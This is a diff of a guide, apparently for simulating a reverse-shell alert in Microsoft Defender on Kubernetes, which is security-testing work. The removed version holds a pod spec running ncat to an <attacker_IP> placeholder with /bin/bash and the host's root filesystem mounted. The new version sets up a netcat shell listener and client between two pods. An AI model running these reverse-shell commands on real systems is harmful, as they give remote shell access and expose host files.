@@ -6,33 +6,48 @@ This is categorized as a Medium severy alert
 
 This alert maps to Exfiltration and Explotation with MITRE ATT&CK® tactics
 
-Create a pod definition file as this:
+Create a deployment definition file as this
 
-Substitue the <attacker_IP> with your own one
-
-This pod will issue the following command /usr/local/bin/ncat <attacker_IP> 8989 -e /bin/bash
-
+we will use 2 pods, one as the server listening for incoming connections and another as the client which will issue reverse shell commands
 
 ```
-apiVersion: v1
-kind: Pod
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: ncat-reverse-shell-pod
+  name: nginx-deployment
   labels:
-    app: ncat
+    app: nginx
 spec:
-  containers:
-  - name: ncat-reverse-shell
-    image: raesene/ncat
-    volumeMounts:
-    - mountPath: /host
-      name: hostvolume
-    args: ['<attacker_IP>', '8989', '-e', '/bin/bash']
-  volumes:
-  - name: hostvolume
-    hostPath:
-      path: /
-      type: Directory
+  replicas: 2
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.14.2
 ```
+Now we need to find the ip address of the 2 new deployed pods
+```
+kubectl get pods -o wide
+```
+
+Enter into one of the pods used as the server
+```
+kubectl exec -it <name-of-serverpod> -- /bin/bash
+```
+and issue netcat to listen to incoming connections of a port of choice
+```
+nc -n -v -l -p 5555 -e /bin/bash
+```
+Enter into the client pod and issue the netcat command
+```
+nc <ipaddress-of-serverpod> 5555
+
+and wait for the Defender alert to appear
 
 ![reverse-shell](/images/reverse-shell.png)
